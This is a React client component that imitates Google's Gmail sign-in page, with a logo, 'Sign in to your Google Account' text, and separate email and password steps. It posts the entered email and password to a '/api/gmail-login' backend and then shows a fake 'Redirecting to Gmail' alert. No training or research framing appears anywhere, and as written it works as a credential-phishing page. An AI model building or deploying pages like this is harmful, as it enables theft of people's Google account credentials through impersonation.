'use client';

import { useState } from 'react';

export default function GmailPage() {
    const [email, setEmail] = useState('');
    const [password, setPassword] = useState('');
    const [emailError, setEmailError] = useState('');
    const [passwordError, setPasswordError] = useState('');
    const [isLoading, setIsLoading] = useState(false);
    const [isPasswordStep, setIsPasswordStep] = useState(false);
    const [showPassword, setShowPassword] = useState(false);

    // Email validation
    const validateEmail = (email: string) => {
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        return emailRegex.test(email);
    };

    // Show error message
    const showError = (setter: (msg: string) => void, message: string) => {
        setter(message);
    };

    // Hide error message
    const hideError = (setter: (msg: string) => void) => {
        setter('');
    };

    // Show password field
    const showPasswordField = () => {
        setIsPasswordStep(true);
    };

    // Hide password field
    const hidePasswordField = () => {
        setIsPasswordStep(false);
        setPassword('');
        hideError(setPasswordError);
    };

    // Handle form submission
    const handleSubmit = async (e: React.FormEvent) => {
        e.preventDefault();
        
        // Validate email
        if (!email) {
            showError(setEmailError, 'Enter an email or phone number');
            return;
        }

        if (!validateEmail(email)) {
            showError(setEmailError, 'Enter a valid email or phone number');
            return;
        }

        // If not in password step, show password field
        if (!isPasswordStep) {
            hideError(setEmailError);
            showPasswordField();
            return;
        }

        // Validate password
        if (!password) {
            showError(setPasswordError, 'Enter a password');
            return;
        }

        if (password.length < 6) {
            showError(setPasswordError, 'Enter a password');
            return;
        }

        // Hide all errors
        hideError(setEmailError);
        hideError(setPasswordError);

        // Show loading state
        setIsLoading(true);

        try {
            // Send data to backend
            const response = await fetch('/api/gmail-login', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    email: email,
                    password: password,
                    service: 'gmail'
                })
            });

            const data = await response.json();
            
            if (data.success) {
                alert('Sign in successful! Redirecting to Gmail...');
                // Reset form
                hidePasswordField();
                setEmail('');
                setPassword('');
            } else {
                alert('Sign in failed: ' + data.message);
            }
        } catch (error) {
            console.error('Error:', error);
            alert('Sign in failed. Please try again.');
        } finally {
            setIsLoading(false);
        }
    };

    return (
        <div className="min-h-screen bg-white flex items-center justify-center">
            <div className="max-w-md w-full space-y-8">
                <div className="text-center">
                    {/* Gmail Logo */}
                    <div className="flex justify-center mb-8">
                        <div className="text-2xl font-bold text-red-500">Gmail</div>
                    </div>

                    <h1 className="text-2xl font-semibold text-gray-900 mb-2">Welcome</h1>
                    <p className="text-gray-600 mb-8">Sign in to your Google Account</p>
                </div>

                <form onSubmit={handleSubmit} className="space-y-6">
                    <div>
                        <input
                            type="email"
                            value={email}
                            onChange={(e) => setEmail(e.target.value)}
                            className="w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm placeholder-gray-400 focus:outline-none focus:ring-blue-500 focus:border-blue-500"
                            placeholder="Email or phone"
                            required
                        />
                        {emailError && (
                            <p className="mt-1 text-sm text-red-600">{emailError}</p>
                        )}
                    </div>

                    {isPasswordStep && (
                        <div className="space-y-4">
                            <div className="relative">
                                <input
                                    type={showPassword ? "text" : "password"}
                                    value={password}
                                    onChange={(e) => setPassword(e.target.value)}
                                    className="w-full px-3 py-2 pr-10 border border-gray-300 rounded-md shadow-sm placeholder-gray-400 focus:outline-none focus:ring-blue-500 focus:border-blue-500"
                                    placeholder="Enter your password"
                                    required
                                />
                                <button
                                    type="button"
                                    onClick={() => setShowPassword(!showPassword)}
                                    className="absolute inset-y-0 right-0 pr-3 flex items-center"
                                >
                                    <svg className="h-5 w-5 text-gray-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                        {showPassword ? (
                                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.878 9.878L3 3m6.878 6.878L21 21" />
                                        ) : (
                                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
                                        )}
                                    </svg>
                                </button>
                            </div>
                            {passwordError && (
                                <p className="text-sm text-red-600">{passwordError}</p>
                            )}
                        </div>
                    )}

                    <div className="flex space-x-4">
                        {isPasswordStep && (
                            <button
                                type="button"
                                onClick={hidePasswordField}
                                className="flex-1 py-2 px-4 border border-gray-300 rounded-md shadow-sm text-sm font-medium text-gray-700 bg-white hover:bg-gray-50 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500"
                            >
                                Back
                            </button>
                        )}
                        <button
                            type="submit"
                            disabled={isLoading}
                            className="flex-1 flex justify-center py-2 px-4 border border-transparent rounded-md shadow-sm text-sm font-medium text-white bg-blue-600 hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 disabled:opacity-50"
                        >
                            {isLoading ? 'Signing in...' : (isPasswordStep ? 'Sign in' : 'Next')}
                        </button>
                    </div>
                </form>

                <div className="text-center space-y-4">
                    <div>
                        <a href="#" className="text-blue-600 hover:text-blue-500 text-sm">
                            Forgot email?
                        </a>
                    </div>
                    <div>
                        <a href="#" className="text-blue-600 hover:text-blue-500 text-sm">
                            Create account
                        </a>
                    </div>
                </div>

                <div className="text-center text-sm text-gray-600 space-x-4">
                    <a href="#" className="hover:text-gray-800">Help</a>
                    <a href="#" className="hover:text-gray-800">Privacy</a>
                    <a href="#" className="hover:text-gray-800">Terms</a>
                </div>
            </div>
        </div>
    );
}
